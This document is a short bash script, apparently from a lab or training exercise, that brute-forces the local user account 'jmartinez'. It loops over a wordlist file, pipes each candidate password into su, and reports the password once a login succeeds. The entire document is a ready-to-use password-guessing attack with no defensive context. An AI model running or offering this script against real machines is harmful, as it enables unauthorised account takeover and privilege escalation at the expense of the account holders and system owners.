#!/bin/bash
USERNAME="jmartinez"
PASSWORD_FILE="passwords.txt"

if [[ ! -f "${PASSWORD_FILE}" ]]; then
  echo "password file does not exist."
  exit 1
fi

while read -r password; do
  echo "Attempting password: ${password} against ${USERNAME}..."
  if echo "${password}" | timeout 0.2 su - ${USERNAME} -c 'whoami' | grep -q "${USERNAME}"; then
    echo
    echo "SUCCESS! The password for ${USERNAME} is ${password}"
    echo "Use su - ${USERNAME} and provide the password to switch"
    exit 0
  fi
done < "${PASSWORD_FILE}"

echo "Unable to compromise ${USERNAME}."
exit 1
